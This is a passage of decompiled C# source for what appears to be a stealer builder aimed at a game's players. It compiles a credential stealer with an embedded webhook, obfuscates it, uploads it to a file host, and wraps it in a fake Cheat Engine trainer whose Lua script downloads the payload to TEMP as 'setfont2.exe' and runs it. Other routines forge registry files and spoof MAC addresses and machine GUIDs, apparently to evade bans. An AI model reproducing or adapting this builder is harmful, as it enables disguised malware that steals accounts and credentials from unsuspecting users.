						compilerParameters.TreatWarningsAsErrors = false;
						if (this.iconcheck.Checked)
						{
							CompilerParameters compilerParameters3 = compilerParameters;
							compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32icon:\"" + this.icontxt.Text + "\"";
						}
						if (this.bindedfiles.Items.Count > 0)
						{
							foreach (object obj in this.bindedfiles.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								compilerParameters.EmbeddedResources.Add(listViewItem.SubItems[0].Text ?? "");
							}
						}
						CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, new string[]
						{
							text3.Replace("//webhook//", Builder.Encode(text))
						});
						string[] files;
						if (compilerResults.Errors.Count > 0)
						{
							MessageBox.Show("Error!", "project 651 - waltix");
							files = Directory.GetFiles(text2);
							for (int i = 0; i < files.Length; i++)
							{
								File.Delete(files[i]);
							}
							Directory.Delete(text2);
						}
						string contents = string.Concat(new string[]
						{
							"<project outputDir=\"",
							text2,
							"\" baseDir=\"",
							text2,
							"\" xmlns=\"http://confuser.codeplex.com\">\r\n  <rule pattern =\"true\" inherit = \"false\"/>\r\n     <module path = \"lmao.exe\">\r\n        <rule pattern = \"true\" preset = \"maximum\" inherit = \"false\"/>\r\n           </module>\r\n         </project>"
						});
						File.WriteAllBytes(text2 + "\\probably.zip", Resources.probably);
						ZipFile.ExtractToDirectory(text2 + "\\probably.zip", text2 + "\\probably");
						File.WriteAllText(text2 + "\\probably\\probably\\probably.crproj", contents);
						Process process = new Process();
						ProcessStartInfo startInfo = new ProcessStartInfo
						{
							FileName = "cmd.exe",
							WindowStyle = ProcessWindowStyle.Hidden,
							Arguments = "/CConfuser.CLI probably.crproj",
							WorkingDirectory = text2 + "\\probably\\probably"
						};
						process.StartInfo = startInfo;
						process.Start();
						process.WaitForExit();
						files = Directory.GetFiles(text2 + "\\probably\\probably");
						for (int i = 0; i < files.Length; i++)
						{
							File.Delete(files[i]);
						}
						Directory.Delete(text2 + "\\probably\\probably");
						Directory.Delete(text2 + "\\probably");
						File.Delete(text2 + "\\probably.zip");
						if (!File.Exists(fileName))
						{
							File.Move(text2 + "\\lmao.exe", fileName);
						}
						else
						{
							File.Delete(fileName);
							File.Move(text2 + "\\lmao.exe", fileName);
						}
						Directory.Delete(text2);
						if (this.pumpFile.Checked)
						{
							try
							{
								
							}
							catch
							{
								MessageBox.Show("Error!", "Project GrowZ - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
								return;
							}
						}
						if (this.cetrainerExtension.Checked)
						{
							using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
							{
								if (File.Exists(fileName))
								{
									AnonFile anonFile = anonFileWrapper.UploadFile(fileName);
									string directDownloadLinkFromLink = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl, "download-url");
									string str3 = "function lolxdxd(xdxd)local xdlol = (5*3-2/8+9*2/9+8*3) end function lolxdxd(lollmaoo)local xdlol = (5*3-2/8+9*2/9+8*3) end local xdlolxd = (5*3-2/8+9*2/9+8*3) local url = '" + directDownloadLinkFromLink + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont2.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont2.exe')";
									File.WriteAllText(Path.GetDirectoryName(fileName) + "\\" + Path.GetFileNameWithoutExtension(fileName) + ".CETRAINER", "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + str3 + "\n</LuaScript>\n</CheatTable>");
								}
							}
							if (File.Exists(fileName))
							{
								File.Delete(fileName);
							}
						}
						MessageBox.Show("Stealer Compiled!", "Project GrowZ - MySk84fun", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				IL_65A:;
			}
			catch
			{
				string path = Environment.ExpandEnvironmentVariables("%TEMP%") + "\\" + str;
				string[] files = Directory.GetFiles(path);
				for (int i = 0; i < files.Length; i++)
				{
					File.Delete(files[i]);
				}
				Directory.Delete(path);
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000021B4 File Offset: 0x000003B4
		private void metroButton5_Click(object sender, EventArgs e)
		{
			//this.manualmactxt.Text = Builder.GetNewMac();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x0000328C File Offset: 0x0000148C
		private void metroButton2_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.manualmactxt.Text))
			{
				MessageBox.Show("MAC Address cant be null.", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			string text = this.manualmactxt.Text;
			text = text.Replace("-", "");
			if (text == "")
			{
				MessageBox.Show("Invalid MAC", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (text.Length != 12)
			{
				MessageBox.Show("Invalid MAC", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			string str = "[" + text + "]==";
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "cmd /c AAP-CL.exe " + str;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
			process.Start();
			process.WaitForExit();
			MessageBox.Show("Done!", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003394 File Offset: 0x00001594
		private void metroButton4_Click(object sender, EventArgs e)
		{
			string text = Builder.Get5RND();
			string text2 = Builder.Get9RND();
			string text3 = Builder.grab5keys();
			string text4 = Builder.grab9keys();
			string[] array = Builder.GrabMGuID();
			string[] listggg = text3.Split(new string[]
			{
				","
			}, StringSplitOptions.RemoveEmptyEntries);
			string[] listggg2 = text4.Split(new string[]
			{
				","
			}, StringSplitOptions.RemoveEmptyEntries);
			string text5 = "";
			string text6 = "";
			foreach (string str in Builder.rand9list(text2, listggg2))
			{
				text5 += str;
			}
			foreach (string str2 in Builder.rand5list(text, listggg))
			{
				text6 += str2;
			}
			string value = Builder.CreateReg(text, text2, text6, text5, array[0], array[1]);
			using (StreamWriter streamWriter = File.CreateText(Directory.GetCurrentDirectory() + "\\Backup.reg"))
			{
				streamWriter.Write(value);
			}
			MessageBox.Show("Backup registry file created!", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000034F0 File Offset: 0x000016F0
		public static string CreateReg(string FiveRND, string NineRND, string FiveRands, string NineRands, string MGUID1, string MGUID2)
		{
			return string.Join(Environment.NewLine, new string[]
			{
				"Windows Registry Editor Version 5.00",
				"[-HKEY_CURRENT_USER\\" + NineRND + "]",
				"[HKEY_CURRENT_USER\\" + NineRND + "]",
				NineRands,
				"",
				"[-HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
				"[HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
				FiveRands,
				"",
				"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]",
				"\"MachineGuid\"=\"" + MGUID1 + "\"",
				"",
				"[HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography]",
				"\"MachineGuid\"=\"" + MGUID2 + "\""
			});
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000035C0 File Offset: 0x000017C0
		public static List<string> rand9list(string rands9, string[] listggg9)
		{
			List<string> list = new List<string>();
			RegistryKey registryKey;
			if (Environment.Is64BitOperatingSystem)
			{
				registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			}
			else
			{
				registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
			}
			try
			{
				registryKey = registryKey.OpenSubKey(rands9, true);
				string[] valueNames = registryKey.GetValueNames();
				for (int i = 0; i < listggg9.Length; i++)
				{
					string text = BitConverter.ToString((byte[])registryKey.GetValue(valueNames[i])).Replace("-", ",").ToLower();
					string item = string.Concat(new string[]
					{
						"\"",
						listggg9[i],
						"\"=hex:",
						text,
						Environment.NewLine
					});
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003694 File Offset: 0x00001894
		public static List<string> rand5list(string rands5, string[] listggg5)
		{
			List<string> list = new List<string>();
			RegistryKey registryKey;
			if (Environment.Is64BitOperatingSystem)
			{
				registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			}
			else
			{
				registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
			}
			try
			{
				registryKey = registryKey.OpenSubKey("Software\\Microsoft\\" + rands5, true);
				string[] valueNames = registryKey.GetValueNames();
				for (int i = 0; i < listggg5.Length; i++)
				{
					string text = BitConverter.ToString((byte[])registryKey.GetValue(valueNames[i])).Replace("-", ",").ToLower();
					string item = string.Concat(new string[]
					{
						"\"",
						listggg5[i],
						"\"=hex:",
						text,
						Environment.NewLine
					});
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003770 File Offset: 0x00001970
		public static string[] GrabMGuID()
		{
			string[] array = new string[]
			{
				"",
				""
			};
			bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
				if (registryKey != null)
				{
					string text = (string)registryKey.GetValue("MachineGuid");
					array[1] = text;
					registryKey.Close();
				}
				if (is64BitOperatingSystem)
				{
					RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
					registryKey2 = registryKey2.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
					if (registryKey2 != null)
					{
						string text2 = (string)registryKey2.GetValue("MachineGuid");
						array[0] = text2;
					}
					registryKey2.Close();
				}
				else if (!is64BitOperatingSystem)
				{
					registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
					registryKey = registryKey.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
					if (registryKey != null)
					{
						string text3 = (string)registryKey.GetValue("MachineGuid");
						array[1] = text3;
						registryKey.Close();
					}
				}
			}
			catch
			{
			}
			return array;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003868 File Offset: 0x00001A68
		public static string Get5RND()
		{
			string result;
			try
			{
				foreach (string text in Registry.CurrentUser.OpenSubKey("Software\\Microsoft", true).GetSubKeyNames())
				{
					if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 5)
					{
						return text;
					}
					if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
					{
						int length = text.Length;
					}
				}
				result = "NULL";
			}
			catch
			{
				result = "NULL";
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000038F4 File Offset: 0x00001AF4
		public static string Get9RND()
		{
			string result;
			try
			{
				foreach (string text in Registry.CurrentUser.GetSubKeyNames())
				{
					if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 9)
					{
						return text;
					}
					if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
					{
						int length = text.Length;
					}
				}
				result = "NULL";
			}
			catch
			{
				result = "NULL";
			}
			return result;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003974 File Offset: 0x00001B74
		public static string grab5keys()
		{
			string text = "";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft");
			foreach (string text2 in registryKey.GetSubKeyNames())
			{
				if (Regex.IsMatch(text2, "^[0-9]+$", RegexOptions.Compiled) && text2.Length == 5)
				{
					foreach (string str in registryKey.OpenSubKey(text2).GetValueNames())
					{
						text = text + str + ",";
					}
				}
			}
			return text.TrimEnd(new char[]
			{
				','
			});
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003A14 File Offset: 0x00001C14
		public static string grab9keys()
		{
			string text = "";
			RegistryKey currentUser = Registry.CurrentUser;
			foreach (string text2 in currentUser.GetSubKeyNames())
			{
				if (Regex.IsMatch(text2, "^[0-9]+$", RegexOptions.Compiled) && text2.Length == 9)
				{
					currentUser.OpenSubKey(text2);
					foreach (string str in currentUser.OpenSubKey(text2).GetValueNames())
					{
						text = text + str + ",";
					}
					break;
				}
			}
			return text.TrimEnd(new char[]
			{
				','
			});
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003AB4 File Offset: 0x00001CB4
		private void metroButton6_Click(object sender, EventArgs e)
		{
			if (this.metroTextBox1.Text != "")
			{
				string text = this.metroTextBox1.Text;
				string text2 = "[" + text + "]==[";
				string str = Directory.GetCurrentDirectory() + "\\Bypass.reg";
				text2 = text2 + str + "]==";
				text2 = text2.Replace(" ", "[SPACE]");
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.Arguments = "cmd /c AAP-CL.exe " + text2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
				process.Start();
				process.WaitForExit();
				MessageBox.Show("Reg file created!", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			MessageBox.Show("Input registry string.", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000021C6 File Offset: 0x000003C6
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCBjFO-AFCnJ4cG-r5ktZdmg");
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000021D3 File Offset: 0x000003D3
		private void Builder_Load(object sender, EventArgs e)
		{
			if (!Directory.Exists("Utils"))
			{
				Directory.CreateDirectory("Utils");
			}
			if (!File.Exists("Utils\\proxy.exe"))
			{
				File.WriteAllBytes("Utils\\proxy.exe", Resources.proxy);
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003BA0 File Offset: 0x00001DA0
		private void metroButton3_Click_1(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.manualmactxt.Text))
			{
				MessageBox.Show("MAC Cant be null!", "project 651 v1.5 - waltix");
				return;
			}
			this.stopproxy.Enabled = true;
			this.startproxy.Enabled = false;
			new Process
			{
				StartInfo = 
				{
					FileName = "Utils\\proxy.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = this.manualmactxt.Text
				}
			}.Start();
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002207 File Offset: 0x00000407
		private void stopproxy_Click(object sender, EventArgs e)
		{
			this.stopproxy.Enabled = false;
			this.startproxy.Enabled = true;
			Process.GetProcessesByName("proxy")[0].Kill();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00006AB0 File Offset: 0x00004CB0
		[CompilerGenerated]
		
		// Token: 0x04000002 RID: 2
		internal static readonly char[] chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();

		// Token: 0x04000003 RID: 3
		public static string Formatfff = "[^a-zA-Z0-9`!@#$%^&*()_+|\\-=\\\\{}\\[\\]:\";'<>?,./]";
	}
}
